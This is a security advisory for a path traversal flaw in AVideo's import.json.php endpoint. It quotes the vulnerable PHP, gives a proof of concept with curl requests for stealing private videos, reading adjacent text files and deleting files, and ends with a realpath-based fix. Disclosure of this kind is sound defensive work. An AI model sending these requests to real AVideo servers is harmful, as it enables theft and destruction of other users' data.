# [H] AVideo has a Path Traversal in import.json.php Allows Private Video Theft and Arbitrary File Read/Deletion via fileURI Parameter

## Summary
Severity: High
Advisory: GHSA-83xq-8jxj-4rxm
CVE: CVE-2026-33493
CWE: CWE-22
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-83xq-8jxj-4rxm
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `objects/import.json.php` endpoint accepts a user-controlled `fileURI` POST parameter with only a regex check that the value ends in `.mp4`. Unlike `objects/listFiles.json.php`, which was hardened with a `realpath()` + directory prefix check to restrict paths to the `videos/` directory, `import.json.php` performs no directory restriction. This allows an authenticated user with upload permission to: (1) steal any other user's private video files by importing them into their own account, (2) read `.txt`/`.html`/`.htm` files adjacent to any `.mp4` file on the filesystem, and (3) delete `.mp4` and adjacent text files if writable by the web server process.

## Details

### Missing path restriction in import.json.php

At `objects/import.json.php:12`, the only validation on the user-supplied `fileURI` is a regex ensuring it ends with `.mp4`:

```php
// objects/import.json.php:12
if (!preg_match("/.*\\.mp4$/i", $_POST['fileURI'])) {
    return false;
}
```

Compare this to the hardened `listFiles.json.php:16-28`, which was patched to restrict paths:

```php
// objects/listFiles.json.php:16-28
$allowedBase = realpath($global['systemRootPath'] . 'videos');
// ...
$resolvedPath = realpath($_POST['path']);
if ($resolvedPath === false || strpos($resolvedPath . '/', $allowedBase) !== 0) {
    http_response_code(403);
    echo json_encode(['error' => 'Path not allowed']);
    exit;
}
```

The same fix was never applied to `import.json.php`.

### Attack Primitive 1: File content disclosure (.txt/.html/.htm)

At lines 23-43, the endpoint strips the `.mp4` extension from `fileURI` and attempts to read adjacent `.txt`, `.html`, or `.htm` files via `file_get_contents()`:

```php
// objects/import.json.php:23-43
$filename = $obj->fileURI['dirname'] . DIRECTORY_SEPARATOR . $obj->fileURI['filename'];
$extensions = ['txt', 'html', 'htm'];
foreach ($extensions as $value) {
    if (file_exists("{$filename}.{$value}")) {
        $html = file_get_contents("{$filename}.{$value}");
        $_POST['description'] = $html;
        // ...
        break;
    }
}
```

The content flows into `$_POST['description']`, which is then saved as the video description by `upload.php:59-64`:

```php
// view/mini-upload-form/upload.php:59-64
if (!empty($_POST['description'])) {
    // ...
    $video->setDescription($_POST['description']);
}
```

The attacker then views the imported video to read the file contents in the description field. This works for any path where both a `.mp4` file and an adjacent `.txt`/`.html`/`.htm` file exist — which is the standard layout for every video in the `videos/` directory.

### Attack Primitive 2: Private video theft

At line 49, the endpoint copies the `.mp4` file to a temp directory and then imports it as the current user's video:

```php
// objects/import.json.php:47-49
$source = $obj->fileURI['dirname'] . DIRECTORY_SEPARATOR . $obj->fileURI['basename'];
if (!copy($source, $tmpFileName)) {
    // ...
}
```

An attacker who knows or can enumerate another user's video filename can copy any private `.mp4` file into their own account.

### Attack Primitive 3: File deletion

At lines 54-65, when `$_POST['delete']` is set, the endpoint deletes the source `.mp4` and adjacent text files:

```php
// objects/import.json.php:54-61
if (!empty($_POST['delete']) && $_POST['delete'] !== 'false') {
    if (is_writable($source)) {
        unlink($source);
        foreach ($extensions as $value) {
            if (file_exists("{$filename}.{$value}")) {
                unlink("{$filename}.{$value}");
            }
        }
    }
}
```

## PoC

### Step 1: Steal a private video

Assuming the attacker knows another user's video filename (e.g., `victim_video_abc123`), which can be enumerated via the platform UI or API:

```bash
curl -b 'PHPSESSID=<authenticated_session_with_upload_perm>' \
  -X POST 'https://target/objects/import.json.php' \
  -d 'fileURI=/var/www/html/AVideo/videos/victim_video_abc123/victim_video_abc123.mp4'
```

**Expected result:** The response returns `{"error":false, "videos_id": <new_id>, ...}`. The victim's private `.mp4` is now imported as the attacker's own video at the returned `videos_id`.

### Step 2: Read another user's video description file

```bash
curl -b 'PHPSESSID=<authenticated_session_with_upload_perm>' \
  -X POST 'https://target/objects/import.json.php' \
  -d 'fileURI=/var/www/html/AVideo/videos/victim_video_abc123/victim_video_abc123.mp4&length=100'
```

**Expected result:** If `victim_video_abc123.txt` (or `.html`/`.htm`) exists alongside the `.mp4`, its contents are stored as the description of the newly created video. The attacker views the video page to read the exfiltrated content.

### Step 3: Delete another user's video

```bash
curl -b 'PHPSESSID=<authenticated_session_with_upload_perm>' \
  -X POST 'https://target/objects/import.json.php' \
  -d 'fileURI=/var/www/html/AVideo/videos/victim_video_abc123/victim_video_abc123.mp4&delete=true'
```

**Expected result:** The victim's `.mp4` file and any adjacent `.txt`/`.html`/`.htm` files are deleted (if writable by the web server process).

## Impact

- **Private video theft**: Any authenticated user with upload permission can import another user's private videos into their own account, bypassing all access controls. This directly compromises video content confidentiality.
- **File content disclosure**: `.txt`, `.html`, and `.htm` files adjacent to any `.mp4` on the filesystem can be read by the attacker. Within the AVideo `videos/` directory, these are video description files that may contain private information.
- **File deletion**: An attacker can delete other users' video files and metadata, causing data loss.
- **Blast radius**: All private videos on the instance are accessible to any user with upload permission. In default AVideo configurations, registered users can upload.

## Recommended Fix

Apply the same `realpath()` + directory prefix check from `listFiles.json.php` to `import.json.php`, immediately after the `.mp4` regex check:

```php
// objects/import.json.php — add after line 14 (the preg_match check)
$allowedBase = realpath($global['systemRootPath'] . 'videos');
if ($allowedBase === false) {
    die(json_encode(['error' => 'Configuration error']));
}
$allowedBase .= '/';

$resolvedDir = realpath(dirname($_POST['fileURI']));
if ($resolvedDir === false || strpos($resolvedDir . '/', $allowedBase) !== 0) {
    http_response_code(403);
    die(json_encode(['error' => 'Path not allowed']));
}
// Reconstruct fileURI from resolved path to prevent symlink bypass
$_POST['fileURI'] = $resolvedDir . '/' . basename($_POST['fileURI']);
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-83xq-8jxj-4rxm
- https://nvd.nist.gov/vuln/detail/CVE-2026-33493
- https://github.com/WWBN/AVideo/commit/e110ff542acdd7e3b81bdd02b8402b9f6a61ad78
- https://github.com/WWBN/AVideo
